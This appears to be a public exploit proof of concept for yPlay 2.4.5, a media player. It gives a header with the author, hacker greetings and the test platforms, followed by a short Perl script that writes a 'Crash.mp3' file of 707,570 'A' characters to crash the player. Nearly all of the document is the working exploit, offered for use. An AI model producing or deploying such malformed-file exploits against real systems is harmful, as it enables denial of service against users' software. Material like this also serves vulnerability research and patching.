#Exploit Title : yPlay Denial of Service Vulnerability
#Software : yPlay
#Software link : http://www.spacejock.m6.net/files/yPlayFull.exe
#Autor : ABDI MOHAMED
#Email : abdimohamed@hotmail.fr
#greetz: net_own3r , sadhacker , net-decrypt3r , xa7m3d , the commander , mr.fearfactor and all tunisian hackers
#Software version : 2.4.5
#Tested on : Win7 Ultimate fr + win xp sp 2
my $file="Crash.mp3";
my $junk="A"x707570;
open(POOH,">$file");
print POOH $junk;
print "[+]Malicious File created successfully!\n";
print "[+]Discovered and Coded by abdimohamed \n";
close(POOH);